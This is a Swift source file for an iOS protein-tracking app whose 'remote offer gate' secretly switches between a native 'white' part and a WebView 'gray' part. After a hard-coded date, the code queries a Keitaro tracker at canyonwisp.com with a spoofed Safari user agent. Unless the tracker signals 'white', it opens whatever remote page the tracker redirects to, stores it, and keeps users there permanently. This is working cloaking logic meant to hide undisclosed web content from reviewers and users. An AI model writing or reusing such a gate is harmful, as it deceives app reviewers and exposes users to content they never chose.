// KitchenRemoteFlow.swift
// Just Protein On Track
//
// Remote offer gate, Firebase + FCM push setup, and splash handoff (parity with reference app flow).

import SwiftUI
import Combine
import UIKit
import Foundation
import Network
import FirebaseCore
import FirebaseMessaging
import UserNotifications

// MARK: - Remote offer config (Temporary schedule.pdf)

enum KitchenOfferConfig {
    /// Keitaro entry is stored split into parts, then assembled as `scheme://hostA.hostB/path` (see §4 PDF).
    static let keitaroURLScheme = "http"
    static let keitaroHostA = "canyonwisp"
    static let keitaroHostB = "com"
    static let keitaroPath = "SdHfN6"

    /// Until this local-calendar day, the app stays on the white (native) path (`yyyy-MM-dd`). §3 PDF.
    static let researchActivationDate = "2025-01-01"

    /// Optional: network request when user already opened the white part (§2.1 PDF).
    static let whiteContextFetchURLString: String? = nil

    /// JSON key that must be present in remote “appdata” style payload to treat response as white flow (§4.1.2 PDF).
    static let whiteConfigRequiredJSONKey = "topic"

    static var assembledKeitaroURLString: String {
        let path = keitaroPath.trimmingCharacters(in: CharacterSet(charactersIn: "/"))
        return "\(keitaroURLScheme)://\(keitaroHostA).\(keitaroHostB)/\(path)"
    }

    static var assembledKeitaroURL: URL? {
        URL(string: assembledKeitaroURLString)
    }

    /// `infoap` token: app name, only letters/digits, no spaces/punctuation (§ PDF).
    static var infoapToken: String {
        let raw = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String
            ?? Bundle.main.object(forInfoDictionaryKey: "CFBundleName") as? String
            ?? "JustProteinOnTrack"
        return String(raw.lowercased().filter { $0.isLetter || $0.isNumber })
    }
}

// MARK: - Flow branch (string storage, §2 PDF)

enum KitchenFlowChoice: String {
    /// Native (“белая часть”)
    case white
    /// WebView (“серая часть”)
    case gray
}

// MARK: - UserDefaults keys

enum KitchenRemoteStorageKeys {
    static let savedTargetAddress = "justProteinOnTrack.remote.savedTargetAddress"
    static let savedReq12Domain = "justProteinOnTrack.remote.savedReq12Domain"
    static let hasShownAlternative = "justProteinOnTrack.remote.hasShownAlternative"
    static let firstLaunchChoice = "justProteinOnTrack.remote.firstLaunchChoice"
    static let pushPermissionPromptPresented = "justProteinOnTrack.push.permissionPromptPresented"
}

// MARK: - Probe timeouts

enum KitchenProbeTimeouts {
    static let savedURLCheck: TimeInterval = 4
    static let fallbackRequest: TimeInterval = 6
    static let firstLaunchServer: TimeInterval = 8
    static let pathMonitorFirstLaunch: TimeInterval = 0.45
}

// MARK: - Flow debug log

enum KitchenRemoteFlowLog {
    static func log(_ message: String) {
        #if DEBUG
        print("[KitchenRemote] \(message)")
        #endif
    }

    static func logURL(_ label: String, _ url: URL?) {
        #if DEBUG
        let u = url?.absoluteString ?? "nil"
        print("[KitchenRemote] \(label): \(u)")
        #endif
    }
}

// MARK: - Shared GET headers (probe ↔ WebView)

enum KitchenOfferHTTP {
    static func applyProbeHeaders(to request: inout URLRequest) {
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("en-US,en;q=0.9", forHTTPHeaderField: "Accept-Language")
        request.setValue(
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
            forHTTPHeaderField: "User-Agent"
        )
    }
}

// MARK: - Launch validation

final class KitchenLaunchValidation {

    static let shared = KitchenLaunchValidation()

    /// Keitaro entry (assembled). Kept mutable so `KitchenPostSplashRouter` can mirror config if needed.
    var primaryServerAddress: String = KitchenOfferConfig.assembledKeitaroURLString
    var researchLaunchDate: String = KitchenOfferConfig.researchActivationDate

    private init() {}

    /// Normalized flow branch; migrates legacy `webView` / `nativeApp`.
    func getFlowChoice() -> KitchenFlowChoice? {
        guard let raw = UserDefaults.standard.string(forKey: KitchenRemoteStorageKeys.firstLaunchChoice) else {
            return nil
        }
        switch raw {
        case KitchenFlowChoice.white.rawValue: return .white
        case KitchenFlowChoice.gray.rawValue: return .gray
        case "nativeApp": return .white
        case "webView": return .gray
        default: return nil
        }
    }

    func setFlowChoice(_ choice: KitchenFlowChoice) {
        UserDefaults.standard.set(choice.rawValue, forKey: KitchenRemoteStorageKeys.firstLaunchChoice)
    }

    func forceFlowChoiceWhite() {
        UserDefaults.standard.set(KitchenFlowChoice.white.rawValue, forKey: KitchenRemoteStorageKeys.firstLaunchChoice)
    }

    func getSavedAddress() -> URL? {
        guard let str = UserDefaults.standard.string(forKey: KitchenRemoteStorageKeys.savedTargetAddress),
              let url = URL(string: str) else { return nil }
        return url
    }

    func setSavedAddress(_ url: URL) {
        UserDefaults.standard.set(url.absoluteString, forKey: KitchenRemoteStorageKeys.savedTargetAddress)
        setSavedReq12Domain(Self.req12ParameterValue(from: url))
    }

    /// Persists WebView URL; updates `req12` only when final resource is not the Keitaro entry (§4.1.1 PDF).
    func setSavedGrayResourceURL(_ url: URL) {
        UserDefaults.standard.set(url.absoluteString, forKey: KitchenRemoteStorageKeys.savedTargetAddress)
        if !isKeitaroEntryURL(url) {
            setSavedReq12Domain(Self.req12ParameterValue(from: url))
        }
    }

    func clearSavedAddress() {
        UserDefaults.standard.removeObject(forKey: KitchenRemoteStorageKeys.savedTargetAddress)
    }

    func getSavedReq12Domain() -> String? {
        UserDefaults.standard.string(forKey: KitchenRemoteStorageKeys.savedReq12Domain)
    }

    func setSavedReq12Domain(_ value: String) {
        let v = Self.normalizedReq12Host(value)
        UserDefaults.standard.set(v, forKey: KitchenRemoteStorageKeys.savedReq12Domain)
    }

    func checkLaunchDate() -> Bool {
        let formatter = DateFormatter()
        formatter.dateFormat = "yyyy-MM-dd"
        formatter.timeZone = TimeZone.current
        guard let launchDate = formatter.date(from: researchLaunchDate) else { return false }
        return Date() >= launchDate
    }

    func checkInternetConnection(timeout: TimeInterval = 2.0) async -> Bool {
        let monitor = NWPathMonitor()
        let queue = DispatchQueue(label: "justProteinOnTrack.remote.network")
        monitor.start(queue: queue)

        return await withCheckedContinuation { continuation in
            var resolved = false
            monitor.pathUpdateHandler = { path in
                guard !resolved else { return }
                resolved = true
                monitor.cancel()
                continuation.resume(returning: path.status == .satisfied)
            }
            queue.asyncAfter(deadline: .now() + timeout) {
                guard !resolved else { return }
                resolved = true
                monitor.cancel()
                continuation.resume(returning: false)
            }
        }
    }

    /// `req12`: registrable-style host, без `www.` (как в ТЗ: `instagram.com`, не `www.instagram.com`).
    static func req12ParameterValue(from url: URL) -> String {
        normalizedReq12Host(url.host ?? "")
    }

    static func normalizedReq12Host(_ host: String) -> String {
        var h = host.lowercased().trimmingCharacters(in: .whitespacesAndNewlines)
        while h.hasPrefix("www.") {
            h = String(h.dropFirst(4))
        }
        return h
    }

    func buildRefetchKeitaroURL() -> URL? {
        var components = URLComponents(string: KitchenOfferConfig.assembledKeitaroURLString)
        let domain = Self.normalizedReq12Host(getSavedReq12Domain() ?? "")
        components?.queryItems = [
            URLQueryItem(name: "infoap", value: KitchenOfferConfig.infoapToken),
            URLQueryItem(name: "req12", value: domain)
        ]
        return components?.url
    }

    func isKeitaroEntryURL(_ url: URL) -> Bool {
        let host = (url.host ?? "").lowercased()
        let expectedHost = "\(KitchenOfferConfig.keitaroHostA).\(KitchenOfferConfig.keitaroHostB)".lowercased()
        guard host == expectedHost else { return false }
        let path = url.path.trimmingCharacters(in: CharacterSet(charactersIn: "/"))
        let expectedPath = KitchenOfferConfig.keitaroPath.trimmingCharacters(in: CharacterSet(charactersIn: "/"))
        return path == expectedPath || path.hasPrefix(expectedPath)
    }

    /// Google Drive / app-context JSON ⇒ white flow (§4.1.2 PDF).
    func shouldRouteToWhiteAfterKeitaroRequest(finalURL: URL?, data: Data?) -> Bool {
        if let finalURL, Self.isLikelyGoogleDriveURL(finalURL) { return true }
        if let data, Self.isWhiteContextJSONPayload(data) { return true }
        return false
    }

    private static func isLikelyGoogleDriveURL(_ url: URL) -> Bool {
        let host = (url.host ?? "").lowercased()
        if host.contains("drive.google.com") { return true }
        if host.contains("docs.google.com") { return true }
        return false
    }

    private static func isWhiteContextJSONPayload(_ data: Data) -> Bool {
        guard let obj = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else { return false }
        return obj[KitchenOfferConfig.whiteConfigRequiredJSONKey] != nil
    }

    /// Older installs may lack `req12`; derive from saved gray URL once.
    func migrateReq12FromSavedAddressIfNeeded() {
        guard getSavedReq12Domain() == nil, let u = getSavedAddress() else { return }
        if !isKeitaroEntryURL(u) {
            setSavedReq12Domain(Self.req12ParameterValue(from: u))
        }
    }
}

// MARK: - Campaign prefetch (splash window)

@MainActor
final class KitchenCampaignPrefetch {

    static let shared = KitchenCampaignPrefetch()

    struct Payload {
        let requestURL: URL
        let data: Data?
        let response: URLResponse?
        let error: Error?
    }

    private var loadTask: Task<Payload, Never>?

    private init() {}

    func beginIfEligible() {
        loadTask?.cancel()
        loadTask = nil

        let v = KitchenLaunchValidation.shared
        guard v.getFlowChoice() == nil else { return }
        guard v.checkLaunchDate() else { return }

        let trimmed = v.primaryServerAddress.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty, let url = URL(string: trimmed) else { return }

        loadTask = Task {
            await Self.fetchCampaign(url: url)
        }
    }

    func consumeIfURLMatches(_ url: URL) async -> Payload? {
        guard let task = loadTask else { return nil }
        loadTask = nil
        let payload = await task.value
        guard payload.requestURL.absoluteString == url.absoluteString else { return nil }
        return payload
    }

    private nonisolated static func fetchCampaign(url: URL) async -> Payload {
        KitchenRemoteFlowLog.logURL("prefetch GET", url)
        var request = URLRequest(url: url)
        request.timeoutInterval = KitchenProbeTimeouts.firstLaunchServer
        request.httpMethod = "GET"
        KitchenOfferHTTP.applyProbeHeaders(to: &request)
        do {
            let (data, response) = try await URLSession.shared.data(for: request)
            return Payload(requestURL: url, data: data, response: response, error: nil)
        } catch {
            return Payload(requestURL: url, data: nil, response: nil, error: error)
        }
    }
}

// MARK: - Launch state machine

private enum KitchenHTTPAcceptance {
    static func isOK(_ status: Int) -> Bool {
        (200...403).contains(status)
    }
}

private enum KitchenURLProbeError: Error {
    case network(underlying: Error)
    case badHTTPStatus(Int)
    case missingHTTPResponse

    var logDescription: String {
        switch self {
        case .network(let e): return e.localizedDescription
        case .badHTTPStatus(let code): return "HTTP \(code)"
        case .missingHTTPResponse: return "missing HTTPURLResponse"
        }
    }
}

enum KitchenLaunchPhase: Equatable {
    case loading
    case webContent(URL)
    case nativeApp
}

@MainActor
final class KitchenLaunchState: ObservableObject {

    @Published private(set) var phase: KitchenLaunchPhase = .loading

    private let validationService = KitchenLaunchValidation.shared

    var primaryServerAddress: String {
        get { validationService.primaryServerAddress }
        set { validationService.primaryServerAddress = newValue }
    }

    func startFlow() {
        phase = .loading
        KitchenRemoteFlowLog.log("start: loading")
        validationService.migrateReq12FromSavedAddressIfNeeded()

        if let choice = validationService.getFlowChoice() {
            KitchenRemoteFlowLog.log("saved flow choice: \(choice.rawValue)")
            handleExistingChoice(choice)
            return
        }

        runFirstLaunchSequence()
    }

    /// §2.1 white: native + optional context request. §2.2 gray: probe saved URL or Keitaro refetch (never white).
    private func handleExistingChoice(_ choice: KitchenFlowChoice) {
        switch choice {
        case .white:
            Task { await fetchWhiteAppContextIfConfigured() }
            phase = .nativeApp

        case .gray:
            guard let saved = validationService.getSavedAddress() else {
                KitchenRemoteFlowLog.log("gray: no saved URL → refetch Keitaro")
                refetchGrayFromKeitaro(allowWhite: false) { [weak self] url in
                    guard let self else { return }
                    if let url {
                        KitchenRemoteFlowLog.logURL("gray open (refetch result)", url)
                        self.validationService.setSavedGrayResourceURL(url)
                        self.validationService.setFlowChoice(.gray)
                        self.phase = .webContent(url)
                    } else if let fallback = self.validationService.buildRefetchKeitaroURL() {
                        KitchenRemoteFlowLog.logURL("gray open (refetch URL fallback)", fallback)
                        self.phase = .webContent(fallback)
                    } else if let entry = URL(string: self.validationService.primaryServerAddress) {
                        KitchenRemoteFlowLog.logURL("gray open (primary entry)", entry)
                        self.phase = .webContent(entry)
                    } else {
                        KitchenRemoteFlowLog.log("gray open about:blank")
                        self.phase = .webContent(URL(string: "about:blank")!)
                    }
                }
                return
            }
            KitchenRemoteFlowLog.logURL("re-verify saved gray URL (probe)", saved)
            probeOfferURL(saved, timeout: KitchenProbeTimeouts.savedURLCheck) { [weak self] result in
                guard let self else { return }
                switch result {
                case .success(let finalURL):
                    KitchenRemoteFlowLog.logURL("probe OK → open", finalURL)
                    if finalURL.absoluteString != saved.absoluteString {
                        self.validationService.setSavedGrayResourceURL(finalURL)
                    }
                    self.phase = .webContent(finalURL)

                case .failure(let err):
                    KitchenRemoteFlowLog.log("probe failed: \(err.logDescription) → Keitaro refetch")
                    self.refetchGrayFromKeitaro(allowWhite: false) { url in
                        if let url {
                            KitchenRemoteFlowLog.logURL("gray open (refetch after probe fail)", url)
                            self.validationService.setSavedGrayResourceURL(url)
                            self.phase = .webContent(url)
                        } else if let openKeitaro = self.validationService.buildRefetchKeitaroURL() {
                            KitchenRemoteFlowLog.logURL("gray open (Keitaro only)", openKeitaro)
                            self.phase = .webContent(openKeitaro)
                        } else {
                            KitchenRemoteFlowLog.logURL("gray open (last saved)", saved)
                            self.phase = .webContent(saved)
                        }
                    }
                }
            }
        }
    }

    /// §2.1 — сетевой запрос в контексте прилы (если задан URL).
    private func fetchWhiteAppContextIfConfigured() async {
        guard let s = KitchenOfferConfig.whiteContextFetchURLString,
              let url = URL(string: s) else { return }
        KitchenRemoteFlowLog.logURL("white context GET", url)
        var request = URLRequest(url: url)
        request.timeoutInterval = 12
        do {
            _ = try await URLSession.shared.data(for: request)
        } catch {
            KitchenRemoteFlowLog.log("white context fetch: \(error.localizedDescription)")
        }
    }

    /// §3 — первый запуск: дата + интернет; без проверки iPad.
    private func runFirstLaunchSequence() {
        let dateOk = validationService.checkLaunchDate()
        KitchenRemoteFlowLog.log("date gate: \(dateOk)")
        if !dateOk {
            validationService.forceFlowChoiceWhite()
            phase = .nativeApp
            return
        }

        let trimmed = validationService.primaryServerAddress.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty, URL(string: trimmed) != nil else {
            validationService.forceFlowChoiceWhite()
            phase = .nativeApp
            return
        }

        Task {
            let hasInternet = await validationService.checkInternetConnection(
                timeout: KitchenProbeTimeouts.pathMonitorFirstLaunch
            )
            guard hasInternet else {
                await MainActor.run {
                    validationService.forceFlowChoiceWhite()
                    phase = .nativeApp
                }
                return
            }
            await applyFirstLaunchServerResultOrFetch()
        }
    }

    private func applyFirstLaunchServerResultOrFetch() async {
        let link = validationService.primaryServerAddress.trimmingCharacters(in: .whitespacesAndNewlines)
        guard let url = URL(string: link) else {
            validationService.forceFlowChoiceWhite()
            phase = .nativeApp
            return
        }

        if let payload = await KitchenCampaignPrefetch.shared.consumeIfURLMatches(url) {
            KitchenRemoteFlowLog.logURL("first launch (prefetch cache)", url)
            handleFirstLaunchKeitaroResponse(data: payload.data, response: payload.response, error: payload.error, baseURL: url)
            return
        }

        requestKeitaroFirstLaunch(baseURL: url)
    }

    private func requestKeitaroFirstLaunch(baseURL: URL) {
        KitchenRemoteFlowLog.logURL("first launch Keitaro GET", baseURL)
        var request = URLRequest(url: baseURL)
        request.timeoutInterval = KitchenProbeTimeouts.firstLaunchServer
        request.httpMethod = "GET"
        KitchenOfferHTTP.applyProbeHeaders(to: &request)

        URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
            Task { @MainActor in
                self?.handleFirstLaunchKeitaroResponse(data: data, response: response, error: error, baseURL: baseURL)
            }
        }.resume()
    }

    /// §4.1 — первый запуск: Drive/JSON → white; иначе gray + сохранить ресурс (не подменять Keitaro на req12).
    private func handleFirstLaunchKeitaroResponse(data: Data?, response: URLResponse?, error: Error?, baseURL: URL) {
        if let error {
            KitchenRemoteFlowLog.log("keitaro error: \(error.localizedDescription)")
            validationService.forceFlowChoiceWhite()
            phase = .nativeApp
            return
        }
        guard let httpResponse = response as? HTTPURLResponse else {
            validationService.forceFlowChoiceWhite()
            phase = .nativeApp
            return
        }

        let status = httpResponse.statusCode
        let acceptable = KitchenHTTPAcceptance.isOK(status)
        KitchenRemoteFlowLog.log("HTTP \(status) acceptable=\(acceptable)")

        guard acceptable else {
            validationService.forceFlowChoiceWhite()
            phase = .nativeApp
            return
        }

        let finalURL = httpResponse.url ?? baseURL
        KitchenRemoteFlowLog.logURL("first launch final URL (after redirects)", finalURL)

        if validationService.shouldRouteToWhiteAfterKeitaroRequest(finalURL: finalURL, data: data) {
            KitchenRemoteFlowLog.log("keitaro → white (Drive / context JSON)")
            validationService.forceFlowChoiceWhite()
            phase = .nativeApp
            return
        }

        validationService.setSavedGrayResourceURL(finalURL)
        validationService.setFlowChoice(.gray)
        UserDefaults.standard.set(true, forKey: KitchenRemoteStorageKeys.hasShownAlternative)
        KitchenRemoteFlowLog.logURL("first launch → WebView open", finalURL)
        phase = .webContent(finalURL)
    }

    /// §2.2 / WebView errors: Keitaro с `infoap` + `req12`. На сером пути не переводим в white (§ PDF).
    private func refetchGrayFromKeitaro(allowWhite: Bool, completion: @escaping (URL?) -> Void) {
        guard let url = validationService.buildRefetchKeitaroURL() else {
            KitchenRemoteFlowLog.log("gray refetch: cannot build Keitaro URL (nil)")
            completion(nil)
            return
        }

        KitchenRemoteFlowLog.logURL("gray refetch Keitaro GET", url)
        var request = URLRequest(url: url)
        request.timeoutInterval = KitchenProbeTimeouts.fallbackRequest
        request.httpMethod = "GET"
        KitchenOfferHTTP.applyProbeHeaders(to: &request)

        URLSession.shared.dataTask(with: request) { [weak self] data, response, error in
            Task { @MainActor in
                guard let self else {
                    completion(nil)
                    return
                }
                if let error {
                    KitchenRemoteFlowLog.log("gray refetch error: \(error.localizedDescription)")
                    completion(nil)
                    return
                }
                guard let http = response as? HTTPURLResponse else {
                    completion(nil)
                    return
                }
                guard KitchenHTTPAcceptance.isOK(http.statusCode), let final = http.url else {
                    completion(nil)
                    return
                }

                if self.validationService.shouldRouteToWhiteAfterKeitaroRequest(finalURL: final, data: data) {
                    if allowWhite {
                        self.validationService.forceFlowChoiceWhite()
                        self.phase = .nativeApp
                    } else {
                        KitchenRemoteFlowLog.log("gray refetch: white-only response ignored (stay gray)")
                    }
                    completion(nil)
                    return
                }

                KitchenRemoteFlowLog.logURL("gray refetch final URL", final)
                completion(final)
            }
        }.resume()
    }

    private func probeOfferURL(_ url: URL, timeout: TimeInterval, completion: @escaping (Result<URL, KitchenURLProbeError>) -> Void) {
        KitchenRemoteFlowLog.logURL("probe GET", url)
        var request = URLRequest(url: url)
        request.timeoutInterval = timeout
        request.httpMethod = "GET"
        KitchenOfferHTTP.applyProbeHeaders(to: &request)

        URLSession.shared.dataTask(with: request) { _, response, error in
            let outcome: Result<URL, KitchenURLProbeError>
            if let error {
                outcome = .failure(.network(underlying: error))
            } else if let http = response as? HTTPURLResponse {
                let code = http.statusCode
                if KitchenHTTPAcceptance.isOK(code) {
                    outcome = .success(http.url ?? url)
                } else {
                    outcome = .failure(.badHTTPStatus(code))
                }
            } else {
                outcome = .failure(.missingHTTPResponse)
            }
            DispatchQueue.main.async {
                completion(outcome)
            }
        }.resume()
    }

    func triggerFallback(currentAddress: URL, completion: @escaping (URL?) -> Void) {
        KitchenRemoteFlowLog.logURL("WebView fallback from", currentAddress)
        refetchGrayFromKeitaro(allowWhite: false) { [weak self] url in
            guard let self else {
                completion(nil)
                return
            }
            if let url {
                self.validationService.setSavedGrayResourceURL(url)
                completion(url)
            } else {
                completion(nil)
            }
        }
    }
}

// MARK: - App delegate (Firebase / APNs / orientation)

final class KitchenIgnitionDelegate: NSObject, UIApplicationDelegate {

    static weak var shared: KitchenIgnitionDelegate?

    private var didInstallFirebaseAndPush = false
    private var pushPermissionRequestScheduled = false

    var orientationLock: UIInterfaceOrientationMask = .portrait {
        didSet {
            guard orientationLock != oldValue else { return }
            applyOrientationToWindowScenes()
            notifyOrientationUpdate()
        }
    }

    func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil
    ) -> Bool {
        Self.shared = self
        installFirebaseAndPushIfNeeded()
        return true
    }

    func installFirebaseAndPushIfNeeded() {
        DispatchQueue.main.async { [weak self] in
            guard let self else { return }
            guard !self.didInstallFirebaseAndPush else { return }
            self.didInstallFirebaseAndPush = true

            FirebaseApp.configure()

            UNUserNotificationCenter.current().delegate = self
            Messaging.messaging().delegate = self
        }
    }

    func requestPushPermissionFromUserContextIfNeeded() {
        DispatchQueue.main.async { [weak self] in
            guard let self else { return }
            guard self.didInstallFirebaseAndPush else { return }
            if UserDefaults.standard.bool(forKey: KitchenRemoteStorageKeys.pushPermissionPromptPresented) { return }
            guard !self.pushPermissionRequestScheduled else { return }
            self.pushPermissionRequestScheduled = true
            UserDefaults.standard.set(true, forKey: KitchenRemoteStorageKeys.pushPermissionPromptPresented)

            UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { _, _ in
                DispatchQueue.main.async {
                    UIApplication.shared.registerForRemoteNotifications()
                }
            }
        }
    }

    func application(
        _ application: UIApplication,
        supportedInterfaceOrientationsFor window: UIWindow?
    ) -> UIInterfaceOrientationMask {
        orientationLock
    }

    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        Messaging.messaging().apnsToken = deviceToken
    }

    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
        #if DEBUG
        print("[KitchenPush] APNs registration failed: \(error.localizedDescription)")
        #endif
    }

    func application(
        _ application: UIApplication,
        didReceiveRemoteNotification userInfo: [AnyHashable: Any],
        fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void
    ) {
        completionHandler(.noData)
    }

    private func applyOrientationToWindowScenes() {
        for scene in UIApplication.shared.connectedScenes {
            guard let windowScene = scene as? UIWindowScene else { continue }
            if #available(iOS 16.0, *) {
                let prefs = UIWindowScene.GeometryPreferences.iOS(interfaceOrientations: orientationLock)
                windowScene.requestGeometryUpdate(prefs) { _ in }
            }
        }
    }

    private func notifyOrientationUpdate() {
        guard let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
              let window = windowScene.windows.first,
              var vc = window.rootViewController else { return }

        while let presented = vc.presentedViewController {
            vc = presented
        }
        if #available(iOS 16.0, *) {
            vc.setNeedsUpdateOfSupportedInterfaceOrientations()
        }
    }
}

extension KitchenIgnitionDelegate: UNUserNotificationCenterDelegate {

    func userNotificationCenter(
        _ center: UNUserNotificationCenter,
        willPresent notification: UNNotification,
        withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void
    ) {
        completionHandler([.banner, .badge, .sound])
    }

    func userNotificationCenter(
        _ center: UNUserNotificationCenter,
        didReceive response: UNNotificationResponse,
        withCompletionHandler completionHandler: @escaping () -> Void
    ) {
        completionHandler()
    }
}

extension KitchenIgnitionDelegate: MessagingDelegate {

    func messaging(_ messaging: Messaging, didReceiveRegistrationToken fcmToken: String?) {
        guard let token = fcmToken, !token.isEmpty else {
            print("[KitchenFCM] registration token: empty or nil")
            return
        }
        print("[KitchenFCM] registration token: \(token)")
        NotificationCenter.default.post(name: .kitchenTrackFCMTokenDidUpdate, object: token)
    }
}

// MARK: - Post-splash remote gate UI

private struct KitchenRemoteLoadGate: View {
    var body: some View {
        ZStack {
            SpicePalette.remoteRecipeBrowserChromeFallback.ignoresSafeArea()
            VStack(spacing: 20) {
                ProgressView()
                    .scaleEffect(1.15)
                    .tint(SpicePalette.saffronGoldFallback)
                Text(L10n.string("remoteGate.loading", fallback: "Loading…"))
                    .font(.system(size: 12, weight: .medium, design: .rounded))
                    .foregroundColor(SpicePalette.flourDustFallback)
            }
        }
    }
}

struct KitchenPostSplashRouter: View {

    @EnvironmentObject private var coordinator: KitchenCoordinator

    @StateObject private var launchState = KitchenLaunchState()
    @State private var didStartLaunchFlow = false
    @State private var didHandOffNative = false

    var body: some View {
        ZStack {
            switch launchState.phase {
            case .loading:
                KitchenRemoteLoadGate()
                    .transition(.opacity)

            case .webContent(let url):
                KitchenRemoteChromeShell(address: url, flowState: launchState)
                    .ignoresSafeArea()
                    .transition(.opacity)

            case .nativeApp:
                SpicePalette.burntCrustFallback
                    .ignoresSafeArea()
            }
        }
        .animation(.easeInOut(duration: 0.45), value: launchState.phase)
        .onAppear {
            guard !didStartLaunchFlow else { return }
            didStartLaunchFlow = true

            launchState.primaryServerAddress = KitchenOfferConfig.assembledKeitaroURLString
            KitchenLaunchValidation.shared.primaryServerAddress = KitchenOfferConfig.assembledKeitaroURLString
            KitchenLaunchValidation.shared.researchLaunchDate = KitchenOfferConfig.researchActivationDate
            launchState.startFlow()
        }
        .onChange(of: launchState.phase) { newPhase in
            if case .nativeApp = newPhase {
                KitchenIgnitionDelegate.shared?.orientationLock = .portrait
                guard !didHandOffNative else { return }
                didHandOffNative = true
                coordinator.enterNativeAfterRemoteOfferGate()
            }
        }
    }
}

extension Notification.Name {
    static let kitchenTrackFCMTokenDidUpdate = Notification.Name("justProteinOnTrack.fcmTokenDidUpdate")
}
